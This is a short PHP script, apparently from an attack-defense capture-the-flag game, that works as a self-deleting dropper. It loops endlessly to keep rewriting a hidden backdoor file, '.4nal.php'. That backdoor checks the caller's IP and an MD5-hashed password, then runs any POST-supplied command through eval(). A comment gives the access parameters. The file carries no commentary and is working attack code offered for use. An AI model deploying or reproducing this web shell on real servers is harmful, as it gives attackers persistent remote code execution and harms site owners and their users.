<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.4nal.php';
$shell = "<?php
\$serverList = array(
   \"192.168.31.1\",
   \"192.168.31.137\",
   \"192.168.31.138\"
   );
\$ip=\$_SERVER['REMOTE_ADDR']; 
foreach (\$serverList as \$host){
   if(\$ip===\$host){
      if(@md5(\$_GET['pass'])==='250f66593905c6ebe61890ae3251435a'){
         @eval(\$_POST[cmd]); 
      }
   }else 
      echo \"<br>FCK U!<br>\";
}
?>";
while (TRUE) {
file_put_contents($file, $shell);
usleep(50);
}
//pass=PK&cmd=
?>